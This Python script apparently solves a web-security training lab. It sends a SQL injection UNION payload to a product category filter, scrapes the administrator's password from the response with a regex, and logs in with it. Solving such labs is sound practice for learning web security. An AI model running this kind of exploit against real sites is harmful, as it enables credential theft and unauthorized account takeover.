"""
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
"""

import requests
import re
from urllib.parse import quote
from proxies import proxies
from sqli_utils import *
import json

def solve(url: str, payload: str):
    r = requests.session()
    login_payload = {
        "username": "administrator",
        "password": "",
        "csrf": "0d7qBuWVD9bYbcrYMb28J6NiYKCt4IWf"
    }
    res = r.get(url + '/filter?category=' + quote(payload), verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return False
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")

    search_results = re.search('<th>administrator:(.*)</th>', res.text)
    if search_results:
        login_payload["password"] = search_results.group(1)
        print("[+] Password located: %s " % login_payload["password"])
        login_result = login_with_username_password(r, url, login_payload)
        if "Congratulations, you solved the lab!" in login_result.text:
            print("[+] ================================")
            print("[+] Login succeeded with user administrator")
            return True

    return False
